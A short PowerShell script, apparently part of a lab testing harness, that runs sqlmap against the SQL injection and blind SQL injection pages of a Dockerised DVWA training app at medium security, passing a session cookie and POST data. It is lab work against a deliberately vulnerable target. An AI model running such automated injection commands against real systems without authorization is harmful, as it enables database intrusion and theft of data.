# Read configuration
$config = Get-Content (Join-Path $PSScriptRoot "..\config.json") | ConvertFrom-Json

# Environment
$target = "dvwa"
$sqlmap_path = [System.IO.Path]::GetFullPath((Join-Path $PSScriptRoot $config.tools.sqlmap))
$output_dir = Join-Path $PSScriptRoot $config.output_raw

$url_sqli = $config.environment.dvwa_docker + "/vulnerabilities/sqli"
$url_blind = $config.environment.dvwa_docker + "/vulnerabilities/sqli_blind"

$phpsessid = $config.targets.$target.phpsessid
$cookie_medium = "security=medium; PHPSESSID={0}" -f $phpsessid
$post_data = "id=1&Submit=Submit#"

# Medium security sqli

python $sqlmap_path -u "$url_sqli" --data "$post_data" --cookie="$cookie_medium" --dbms="MySQL" --batch --output-dir="$output_dir\dvwa_medium"

# Medium security sqli (blind)

python $sqlmap_path -u "$url_blind" --data "$post_data" --cookie="$cookie_medium" --dbms="MySQL" --batch --output-dir="$output_dir\dvwa_medium"

